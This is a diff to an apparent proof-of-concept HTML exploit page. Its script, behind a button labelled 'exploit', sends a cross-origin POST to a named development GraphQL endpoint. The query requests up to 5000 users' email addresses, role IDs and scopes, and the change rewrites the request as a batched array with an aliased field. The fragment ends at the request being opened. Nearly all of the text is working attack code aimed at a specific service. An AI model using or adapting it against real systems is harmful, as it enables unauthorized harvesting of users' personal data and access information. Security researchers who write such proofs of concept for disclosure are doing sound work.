@@ -12,16 +12,14 @@
     <script>
         document.getElementById('exploit').addEventListener('click', function () {
             var targetUrl = 'https://app-dev.traceable.ai/graphql';
-            var requestBody = JSON.stringify({
-                variables: {},
-                query: `
-                {
+            const requestBody = JSON.stringify([{
+                "variables": {},
+                "query": `{
                     users(limit: 5000) {
                         results {
                             email
                             roles {
-                                roleId
-                                id
+                                roleId: id
                                 scope {
                                     entityScopes {
                                         type
@@ -39,7 +37,7 @@
                         __typename
                     }
                 }`
-            });
+            }]);
 
             var xhr = new XMLHttpRequest();
             xhr.open('POST', targetUrl, true);
